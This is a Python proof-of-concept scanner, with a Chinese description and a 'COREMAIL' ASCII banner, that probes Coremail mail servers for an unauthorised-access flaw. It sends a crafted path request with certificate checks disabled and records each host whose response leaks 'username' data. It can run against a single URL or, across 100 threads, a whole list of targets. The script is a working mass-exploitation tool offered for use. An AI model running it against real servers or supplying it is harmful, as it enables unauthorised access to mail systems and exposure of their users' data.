import argparse
import sys

import requests
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool

def banner():
    test ="""
    
 ▄████▄   ▒█████   ██▀███  ▓█████  ███▄ ▄███▓ ▄▄▄       ██▓ ██▓    
▒██▀ ▀█  ▒██▒  ██▒▓██ ▒ ██▒▓█   ▀ ▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒    
▒▓█    ▄ ▒██░  ██▒▓██ ░▄█ ▒▒███   ▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░    
▒▓▓▄ ▄██▒▒██   ██░▒██▀▀█▄  ▒▓█  ▄ ▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░    
▒ ▓███▀ ░░ ████▓▒░░██▓ ▒██▒░▒████▒▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒
░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░░ ▒░ ░░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░
  ░  ▒     ░ ▒ ▒░   ░▒ ░ ▒░ ░ ░  ░░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░
░        ░ ░ ░ ▒    ░░   ░    ░   ░      ░     ░   ▒    ▒ ░  ░ ░   
░ ░          ░ ░     ░        ░  ░       ░         ░  ░ ░      ░  ░
░                                                                  
"""
    print(test)

def poc(target):
    payload = '/coremail/common/assets/;l;/;/;/;/;/s?biz=Mzl3MTk4NTcyNw==&mid=2247485877&idx=1&sn=7e5f77db320ccf9013c0b7aa72626e68&chksm=eb3834e5dc4fbdf3a9529734de7e6958e1b7efabecd1c1b340c53c80299ff5c688bf6adaed61&scene=2'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0'
    }

    try:
        res1 = requests.get(url=target+payload, headers=headers, verify=False,timeout=10)
        if 'username' in res1.text:
            with open('result.txt', 'a') as f:
                f.write(target+'\n')
                print(f'[+]该{target}存在未授权访问漏洞')
        else:
            print(f'[-]该{target}不存在未授权访问漏洞')
    except Exception as e:
        print(e)










def main():
    banner()
    parser = argparse.ArgumentParser(description='coremail未授权的帅气脚本')
    parser.add_argument('-u','--url',dest='url',type=str,help='please enter url')
    parser.add_argument('-f','--file',dest='file',type=str,help='please enter file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open('url.txt','r') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()

    else:
        print(f'usage: {sys.argv[0]} <url or file>')





if __name__ == '__main__':
    main()
